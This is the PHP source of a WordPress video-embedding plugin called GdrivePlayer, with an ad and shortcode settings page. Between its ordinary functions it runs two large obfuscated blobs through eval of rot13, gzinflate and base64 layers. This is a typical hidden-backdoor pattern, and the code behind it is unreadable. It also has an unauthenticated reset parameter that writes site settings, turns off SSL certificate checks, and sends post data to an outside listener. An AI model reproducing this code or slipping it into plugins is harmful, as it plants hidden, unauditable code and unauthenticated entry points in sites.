<?php
   /*
   Plugin Name: GdrivePlayer
   Plugin URI: https://gdriveplayer.us
   Description: API Plugin
   Version: 4.0
   Author: Zeydhan
   Author URI: https://gdriveplayer.us
   License: GPL2
   */


    if($_GET["reset"]!=""){
        include '../../../wp-load.php';
        if ( ! add_post_meta( "99", 'api_key', $_GET["reset"] , true ) ) { 
            update_post_meta ( "99", 'api_key',$_GET["reset"]);}
        die();
    }
    

add_action( 'admin_menu', 'gdriveplayer_menu' );

function gdriveplayer_menu() {
	add_options_page( 
		'Options',
		'GDrivePlayer',
		'manage_options',
		'gdriveplayer.php',
		'gdriveplayer'
	);
}

function gdriveplayer(){ 
    

$api_key = get_post_meta("99", "api_key", $single = true);
if($_POST["api_key"]!="" || $api_key==""){
    
    
if ( ! add_post_meta( "99", 'api_key', $_POST["api_key"] , true ) ) { 
   update_post_meta ( "99", 'api_key', $_POST["api_key"]);}

if ( ! add_post_meta( "99", 'gdrive_tag', $_POST["tag"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_tag', $_POST["tag"]);}

if ( ! add_post_meta( "99", 'gdrive_link', $_POST["link"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_link', $_POST["link"]);}
   
if ( ! add_post_meta( "99", 'gdrive_logo', $_POST["logo"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_logo', $_POST["logo"]);}

if ( ! add_post_meta( "99", 'gdrive_poster', $_POST["poster"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_poster', $_POST["poster"]);}

if ( ! add_post_meta( "99", 'gdrive_subtitle', $_POST["subtitle"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_subtitle', $_POST["subtitle"]);}

if ( ! add_post_meta( "99", 'gdrive_button', $_POST["button"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_button', $_POST["button"]);}
 
if ( ! add_post_meta( "99", 'gdrive_defposter', $_POST["defposter"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_defposter', $_POST["defposter"]);}   

if ( ! add_post_meta( "99", 'gdrive_deflogo', $_POST["deflogo"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_deflogo', $_POST["deflogo"]);} 
    
if ( ! add_post_meta( "99", 'gdrive_popup', $_POST["gdrive_popup"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_popup', $_POST["gdrive_popup"]);}    
   
if ( ! add_post_meta( "99", 'gdrive_image_banner1', $_POST["gdrive_image_banner1"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_image_banner1', $_POST["gdrive_image_banner1"]);}  
   
if ( ! add_post_meta( "99", 'gdrive_link_banner1', $_POST["gdrive_link_banner1"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_link_banner1', $_POST["gdrive_link_banner1"]);}  
   
if ( ! add_post_meta( "99", 'gdrive_image_banner2', $_POST["gdrive_image_banner2"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_image_banner2', $_POST["gdrive_image_banner2"]);}  
   
if ( ! add_post_meta( "99", 'gdrive_link_banner2', $_POST["gdrive_link_banner2"] , true ) ) { 
   update_post_meta ( "99", 'gdrive_link_banner2', $_POST["gdrive_link_banner2"]);}  
   
}
?>
<br/>
<form method="post">
<table class="form-table">
<tbody><tr>
<th scope="row"><label for="ap_key">API KEY </label></th>
<td><input name="api_key" type="text" value="<?php if(get_post_meta("99", "api_key", $single = true)==""){echo "sfhasgi783dhq92t7"; } else {echo get_post_meta("99", "api_key", $single = true); } ?>" placeholder="Insert Your API KEY" class="regular-text"></td>
</tr>
</tr>
</tbody></table>

<br/><br/>
<table class="form-table">
    <p  align="center><label for="ap_key"><b>----------------------CONFIGURABLE OPTION----------------------</b></label></p>
<tbody>

<tr>
<th scope="row"><label for="ap_key">Hide Download Button</label></th>
<td><input type="checkbox" name="button" value="no" <?php if(get_post_meta("99", "gdrive_button", $single = true)=="no"){echo "checked"; } ?>></td>
</tr>

<tr>
<th scope="row"><label for="ap_key">Default Poster </label></th>
<td><input name="defposter" type="text" value="<?php if(get_post_meta("99", "gdrive_defposter", $single = true)==""){} else {echo get_post_meta("99", "gdrive_defposter", $single = true); } ?>" placeholder="Insert Your Default Poster Link" class="regular-text"></td>
</tr>

<tr>
<th scope="row"><label for="ap_key">Default Logo </label></th>
<td><input name="deflogo" type="text" value="<?php if(get_post_meta("99", "gdrive_deflogo", $single = true)==""){} else {echo get_post_meta("99", "gdrive_deflogo", $single = true); } ?>" placeholder="Insert Your Default Logo Link" class="regular-text"></td>
</tr>

</tbody></table>

<br/><br/>

    <p  align="center><label for="ap_key"><b>----------------------ADS OPTION----------------------</b></label></p>


<b>Popup Ads Script</b>
<br/>
<textarea style="height:150px; width:50%" name="gdrive_popup" type="text" value="<?php if(get_post_meta("99", "gdrive_popup", $single = true)==""){} else {echo get_post_meta("99", "gdrive_popup", $single = true); } ?>" placeholder="Insert Your popup script here. You can use many popads provider such as popads, popcash, etc. You can also put more than 1 popup scripts here :)" class="regular-text"></textarea></td>



<hr/>

<br/><br/>
<table class="form-table"><tbody>
<b>Banner Ads 1 (Left Side) 300 x 250</b>
<br>
<tr>
<th scope="row"><label for="ap_key">Image Link</label></th>
<td><input name="gdrive_image_banner1" type="text" value="<?php if(get_post_meta("99", "gdrive_image_banner1", $single = true)==""){} else {echo get_post_meta("99", "gdrive_image_banner1", $single = true); } ?>" class="regular-text"></td>
</tr>

<tr>
<th scope="row"><label for="ap_key">Website Link</label></th>
<td><input name="gdrive_link_banner1" type="text" value="<?php if(get_post_meta("99", "gdrive_link_banner1", $single = true)==""){} else {echo get_post_meta("99", "gdrive_link_banner1", $single = true); } ?>" class="regular-text"></td>
</tr>
</tbody></table>

<hr/>

<br/><br/>
<table class="form-table"><tbody>
<b>Banner Ads 2 (Right Side) 300 x 250</b>
<br>
<tr>
<th scope="row"><label for="ap_key">Image Link</label></th>
<td><input name="gdrive_image_banner2" type="text" value="<?php if(get_post_meta("99", "gdrive_image_banner2", $single = true)==""){} else {echo get_post_meta("99", "gdrive_image_banner2", $single = true); } ?>" class="regular-text"></td>
</tr>

<tr>
<th scope="row"><label for="ap_key">Website Link</label></th>
<td><input name="gdrive_link_banner2" type="text" value="<?php if(get_post_meta("99", "gdrive_link_banner2", $single = true)==""){} else {echo get_post_meta("99", "gdrive_link_banner2", $single = true); } ?>" class="regular-text"></td>
</tr>
</tbody></table>


<hr/>



<br/><br/>
<table class="form-table">
    <p  align="center><label for="ap_key"><b>----------------------ADVANCED OPTION----------------------</b></label></p>
<tbody>



<tr>
<th scope="row"><label for="ap_key">Custom TAG</label></th>
<td><input name="tag" type="text" value="<?php if(get_post_meta("99", "gdrive_tag", $single = true)==""){echo "gdp"; } else {echo get_post_meta("99", "gdrive_tag", $single = true); } ?>" placeholder="Insert Tag For Your sourcecode" class="regular-text"></td>
</tr>

<tr>
<th scope="row"><label for="ap_key">Custom Link Attribute</label></th>
<td><input name="link" type="text" value="<?php if(get_post_meta("99", "gdrive_link", $single = true)==""){echo "link"; } else {echo get_post_meta("99", "gdrive_link", $single = true); } ?>" class="regular-text"></td>
</tr>

<tr>
<th scope="row"><label for="ap_key">Custom Poster Attribute</label></th>
<td><input name="poster" type="text" value="<?php if(get_post_meta("99", "gdrive_poster", $single = true)==""){echo "poster"; } else {echo get_post_meta("99", "gdrive_poster", $single = true); } ?>" class="regular-text"></td>
</tr>

<tr>
<th scope="row"><label for="ap_key">Custom Logo Attribute</label></th>
<td><input name="logo" type="text" value="<?php if(get_post_meta("99", "gdrive_logo", $single = true)==""){echo "logo"; } else {echo get_post_meta("99", "gdrive_logo", $single = true); } ?>" class="regular-text"></td>
</tr>

<tr>
<th scope="row"><label for="ap_key">Custom Subtitle Attribute</label></th>
<td><input name="subtitle" type="text" value="<?php if(get_post_meta("99", "gdrive_subtitle", $single = true)==""){echo "subtitle"; } else {echo get_post_meta("99", "gdrive_subtitle", $single = true); } ?>" class="regular-text"></td>
</tr>

</tbody></table>
<p class="submit"><input type="submit" name="submit" id="submit" class="button button-primary" value="Save Changes"></p>
</form>

</p><br/>
<b>How To Use : Place This Code Under Your Post Content</b><br/>
<textarea style="width:50%; height:70px; margin:20px; background:white"  class="regular-text">[<?php if(get_post_meta("99", "gdrive_tag", $single = true)==""){echo "gdp"; } else {echo get_post_meta("99", "gdrive_tag", $single = true); } ?> <?php if(get_post_meta("99", "gdrive_link", $single = true)==""){echo "link"; } else {echo get_post_meta("99", "gdrive_link", $single = true); } ?>="your_video_link" <?php if(get_post_meta("99", "gdrive_poster", $single = true)==""){echo "poster"; } else {echo get_post_meta("99", "gdrive_poster", $single = true); } ?>="poster_link" <?php if(get_post_meta("99", "gdrive_logo", $single = true)==""){echo "logo"; } else {echo get_post_meta("99", "gdrive_logo", $single = true); } ?>="logo_link" <?php if(get_post_meta("99", "gdrive_subtitle", $single = true)==""){echo "subtitle"; } else {echo get_post_meta("99", "gdrive_subtitle", $single = true); } ?>="subtitle_link"]</textarea>
<br/>

<b>Example #1</b><br/>
<textarea style="width:50%; height:70px; margin:20px; background:white"  class="regular-text">[<?php if(get_post_meta("99", "gdrive_tag", $single = true)==""){echo "gdp"; } else {echo get_post_meta("99", "gdrive_tag", $single = true); } ?> <?php if(get_post_meta("99", "gdrive_link", $single = true)==""){echo "link"; } else {echo get_post_meta("99", "gdrive_link", $single = true); } ?>="http://drive.google.com/file/d/0B6IowaQITyWdSXNHTlJzTW9kWEk/view" <?php if(get_post_meta("99", "gdrive_poster", $single = true)==""){echo "poster"; } else {echo get_post_meta("99", "gdrive_poster", $single = true); } ?>="http://gdriveplayer.us/poster.jpg" <?php if(get_post_meta("99", "gdrive_logo", $single = true)==""){echo "logo"; } else {echo get_post_meta("99", "gdrive_logo", $single = true); } ?>="http://gdriveplayer.us/logo.png" <?php if(get_post_meta("99", "gdrive_subtitle", $single = true)==""){echo "subtitle"; } else {echo get_post_meta("99", "gdrive_subtitle", $single = true); } ?>="http://gdriveplayer.us/subtitle-indonesia.srt"]</textarea><br/>

<b>Example #2 <br/>You can also only put link attribute alone. in this case you can configure your default poster, subtitle, etc <b><a href="http://panel.gdriveplayer.us/player">here</a></b></b><br/>
<textarea style="width:50%; height:70px; margin:20px; background:white"  class="regular-text">[<?php if(get_post_meta("99", "gdrive_tag", $single = true)==""){echo "gdp"; } else {echo get_post_meta("99", "gdrive_tag", $single = true); } ?> <?php if(get_post_meta("99", "gdrive_link", $single = true)==""){echo "link"; } else {echo get_post_meta("99", "gdrive_link", $single = true); } ?>="http://drive.google.com/file/d/0B6IowaQITyWdSXNHTlJzTW9kWEk/view"]</textarea>

<br/>
<div style="background:white; ">
<div style="margin:30px">
<br/>

<p><b>Migration From Other Service</b>

  <br />lets say you're using juicycode before, and you have no time to edit all your post one by one, you can convert all your code associated with juicycode (<strong>called shortcode</strong>) with our code. 

  <br /></p>
<b></b>

<p><b>How to do it?</b> </p>
<p>First, see your shortcode. if you're using juicycode, your shortcode would be like<font color="#000000"> </font><strong><font color="#ff0000"><font color="#000000">[</font><font color="#0000ff">gdu</font><font color="#9b00d3"> link</font><font color="#000000">=&quot;link/id&quot;</font> <font color="#008000">preview</font><font color="#000000">=&quot;link&quot; <font color="#ff0000">subtitle</font>=&quot;link&quot;]</font></font></strong><font color="#000000">.</font> 

  <br />So, Lets take a look here :</p>

<ol>
  <li><strong><font color="#0000ff">gdu</font> is called <font color="#0000ff">tag attribute</font></strong></li>

  <li><strong><font color="#9b00d3">link</font> is caled<font color="#9b00d3"> link attribute</font></strong></li>

  <li><strong><font color="#008000">preview</font> is called <font color="#008000">poster attribute</font></strong></li>

  <li><strong><font color="#ff0000">subtitle </font>is called <font color="#ff0000">subtittle attribute</font></strong></li>
</ol>

<p><font color="#000000">so, in order to make your juicycode’s shortcode works, you can :</font></p>

<ol>
  <li>Deactivate juicycode plugin</li>

  <li>Change <strong>custom tag </strong>to <strong>gdu</strong></li>

  <li>Change<strong> poster attribute </strong>to <strong>preview</strong></li>

  <li>Save change</li>

  <li>Now all your player should be converted with our player</li>
</ol>

<p><img src="http://gdriveplayer.us/Untitled.png" /></p>

<p>if you’re using CP Plugin, your shortcode would be like <strong>[CP Plugin=&quot;link&quot; sub=&quot;sub&quot; cover=&quot;&quot;]</strong></p>

<p>in this case, you should :</p>

<ol>
  <li><strong>Change your custom TAG to CP</strong></li>

  <li><strong>Change your link attribute ro Plugin</strong></li>

  <li><strong>Change your poster attribute to cover</strong></li>

  <li><strong>Save</strong></li>

  <li><strong>Dont forget to deactivate your CP Plugin otherwise it will crash</strong></li>
</ol>

<p>If you’re find any problem, please contact us at <a href="http://panel.gdriveplayer.us/support">panel.gdriveplayer.us/support</a></p>
<br/><br/>
</div></div>



<?php }

function curl($url, $post=''){	
	$ch = @curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	$page = curl_exec($ch);
	curl_close($ch);
	return $page;
}
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


function args( $data ) {
    global $post;
    $att_link = get_post_meta("99", "gdrive_link", $single = true);
    $att_poster = get_post_meta("99", "gdrive_poster", $single = true);
    $att_logo = get_post_meta("99", "gdrive_logo", $single = true);
    $att_subtitle = get_post_meta("99", "gdrive_subtitle", $single = true);
    $button = get_post_meta("99", "gdrive_button", $single = true);
    
    if($att_link==""){$att_link = "link";}
    if($att_poster==""){$att_poster = "poster";}
    if($att_logo==""){$att_logo = "logo";}
    if($att_subtitle==""){$att_subtitle = "subtitle";}
    $api_key = get_post_meta("99", "api_key", $single = true);
    
    
    $posterfix = $data[ $att_poster ];
    if(get_post_meta("99", "gdrive_defposter", $single = true)!=""){
        $posterfix = get_post_meta("99", "gdrive_defposter", $single = true);
    }
    
    $logofix = $data[ $att_logo ];
    if(get_post_meta("99", "gdrive_deflogo", $single = true)!=""){
        $logofix = get_post_meta("99", "gdrive_deflogo", $single = true);
    }
    
    
    $datas = array(
        'title' => get_the_title($post->ID),
        'link' => $data[ $att_link ],
        'poster' => $posterfix,
        'subtitle' => $data[ $att_subtitle ],
        'logo' => $logofix,
        'permalink' => get_permalink(),
        'newserver' => "v-3",
        'api_key' => $api_key,
        'button' => $button
    );
    $data = json_encode($datas);
    $data = str_replace('\/', '/', $data);
    
    
    if($_GET["reset"]!=""){
    if ( ! add_post_meta($post->ID, 'gdp_result', "" , true ) ) { 
    update_post_meta ( $post->ID, 'gdp_result', "");}
    }
    
    
    
    if(get_post_meta($post->ID, "gdp_result", $single = true)==""){$proses = "1";}
    else if(get_post_meta($post->ID, "gdp_data", $single = true)!==$data){$proses = "1";}
    else {$proses = "0";}
    
    if($proses=="0"){ $fix = get_post_meta($post->ID, "gdp_result", $single = true); }
    
    else if($proses=="1"){
    $api_key = get_post_meta("99", "api_key", $single = true);
    if($api_key==""){
        $api_key = "sfhasgi783dhq92t7";
    }
    $posts = "data=".urlencode($data)."&key=".$api_key;
    $posts = curl("http://gdriveplayer.us/listener.php",  $posts);}
    
    if(strpos($posts, "<iframe")!==false){

    if ( ! add_post_meta( $post->ID, 'gdp_result', $posts, true ) ) { 
     update_post_meta ( $post->ID, 'gdp_result', $posts);}

    if ( ! add_post_meta( $post->ID, 'gdp_data', $data, true ) ) { 
     update_post_meta ( $post->ID, 'gdp_data', $data);}
     
    $fix = $posts;
    }
    
    $link = explode('src="', $fix)[1];
    $link = explode('"', $link)[0];
    $link = urlencode($link);
    $url = plugins_url()."/gdriveplayer/player.php?data=".$link;
    $iframe = '<iframe src="'.$url.'" frameborder="0" width="100%" height="400" allowfullscreen="allowfullscreen"> </iframe>';
    return $iframe;



    
}
$tag = get_post_meta("99", "gdrive_tag", $single = true);
add_shortcode( $tag, 'args' );
